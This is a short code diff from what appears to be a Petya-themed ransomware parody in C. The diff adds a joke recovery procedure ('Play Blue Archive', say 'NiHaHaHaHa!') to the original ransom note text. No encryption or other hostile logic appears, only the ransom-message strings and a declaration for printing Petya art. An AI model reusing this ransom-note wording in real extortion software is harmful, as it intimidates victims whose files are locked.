@@ -46,7 +46,12 @@
 "If you see this text, then your files are no longer accessible,\n" \
 "because they have been encrypted. Perhaps you are busy looking for a way to\n" \
 "recover your files, but don't waste your time.\n" \
-"Nobody can recover your file without our decryption service.\n"
+"Nobody can recover your file without our decryption service.\n" \
+"\n" \
+"We guaratee that you can recover all your files safely and easily.\n" \
+"All you need to do is the following:\n\n" \
+"1. Play Blue Archive.\n\n" \
+"2. Say this sentence out loud:\n\t\"NiHaHaHaHa!\"\n\n" 
 
 void print_petya_art(void);
 
